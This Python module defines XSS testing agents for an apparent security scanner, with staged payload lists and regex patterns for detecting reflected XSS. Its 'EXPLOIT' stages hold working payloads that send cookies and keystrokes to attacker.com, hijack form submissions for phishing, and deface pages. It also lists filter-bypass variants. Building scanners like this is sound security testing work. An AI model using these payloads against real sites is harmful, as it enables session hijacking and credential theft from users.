"""Cross-Site Scripting (XSS) Agent - CWE-79."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class XSSAgent(BaseAgent):
    """
    Cross-Site Scripting (XSS) testing agent.

    Tests for various XSS vulnerabilities including:
    - Reflected XSS
    - Stored XSS indicators
    - DOM-based XSS
    - Various context escaping

    Payloads derived from ZAP's CrossSiteScriptingScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "xss"

    @property
    def cweid(self) -> int:
        return 79

    @property
    def priority(self) -> int:
        return 7  # High priority

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Basic probes to check reflection
                "<script>alert(1)</script>",
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                # Safe probes to detect reflection
                "<zap>test</zap>",
                "'\"><zap>test</zap>",
                # Event handlers
                "\" onmouseover=\"alert(1)",
                "' onmouseover='alert(1)",
            ],
            PayloadStage.CONFIRM: [
                # HTML context
                "<script>alert(document.domain)</script>",
                "<body onload=alert(1)>",
                "<iframe src=\"javascript:alert(1)\">",
                # Attribute context
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "' onfocus='alert(1)' autofocus='",
                "\" onload=\"alert(1)\"",
                # JavaScript context
                "';alert(1);//",
                "\";alert(1);//",
                "</script><script>alert(1)</script>",
                # Various tags
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<video src=x onerror=alert(1)>",
            ],
            PayloadStage.EXPLOIT: [
                # Cookie theft
                "<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>",
                "<img src=x onerror=\"this.src='http://attacker.com/?c='+document.cookie\">",
                # Keylogging
                "<script>document.onkeypress=function(e){new Image().src='http://attacker.com/?k='+e.key}</script>",
                # DOM manipulation
                "<script>document.body.innerHTML='<h1>Hacked</h1>'</script>",
                # Form hijacking
                "<script>document.forms[0].action='http://attacker.com/phish'</script>",
            ],
            PayloadStage.BYPASS: [
                # Case variations
                "<ScRiPt>alert(1)</ScRiPt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                # Encoding
                "<script>alert&#40;1&#41;</script>",
                "<script>alert\u0028\u0031\u0029</script>",
                # Whitespace tricks
                "<script\n>alert(1)</script>",
                "<script\t>alert(1)</script>",
                "<script/anything>alert(1)</script>",
                # No quotes
                "<img src=x onerror=alert(1)>",
                # SVG/Math
                "<svg><script>alert(1)</script></svg>",
                "<math><maction actiontype=\"statusline#http://attacker.com\">Click</maction></math>",
                # Data URIs
                "<object data=\"data:text/html,<script>alert(1)</script>\">",
                # Expression (IE)
                "<div style=\"width:expression(alert(1))\">",
                # Template literals
                "${alert(1)}",
                "{{constructor.constructor('alert(1)')()}}",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate XSS vulnerability."""
        patterns = [
            # Script tag reflection
            r"<script[^>]*>.*?</script>",
            r"<script[^>]*>",
            # Event handlers
            r"on\w+\s*=",
            r"javascript:",
            # Our probe tags
            r"<zap>.*?</zap>",
            # SVG/Math vectors
            r"<svg[^>]*>",
            r"<math[^>]*>",
            # Data URIs in context
            r"data:text/html",
            # Expression (IE)
            r"expression\s*\(",
            # Template injection
            r"\$\{[^}]+\}",
            r"\{\{[^}]+\}\}",
        ]
        return [re.compile(p, re.IGNORECASE | re.DOTALL) for p in patterns]


class XSSReflectedAgent(XSSAgent):
    """Specialized agent for reflected XSS."""

    @property
    def vulnerability_type(self) -> str:
        return "xss_reflected"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        # Use focused payloads for reflected context
        base = super().staged_payloads
        base[PayloadStage.PROBE] = [
            "<xsstest>",
            "'\"><xsstest>",
            "<script>xsstest</script>",
            "javascript:xsstest",
        ]
        return base


class XSSDOMAgent(XSSAgent):
    """Specialized agent for DOM-based XSS."""

    @property
    def vulnerability_type(self) -> str:
        return "xss_dom"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # URL fragment payloads
                "#<script>alert(1)</script>",
                "#\"><script>alert(1)</script>",
                # document.write sources
                "javascript:document.write('test')",
            ],
            PayloadStage.CONFIRM: [
                "#<img src=x onerror=alert(1)>",
                "#';alert(1);//",
                "?param=<script>alert(1)</script>",
            ],
            PayloadStage.EXPLOIT: [
                "#<script>alert(document.domain)</script>",
                "#<img src=x onerror=\"location='http://attacker.com/?c='+document.cookie\">",
            ],
            PayloadStage.BYPASS: [
                "#<svg/onload=alert(1)>",
                "#<body/onload=alert(1)>",
            ],
        }
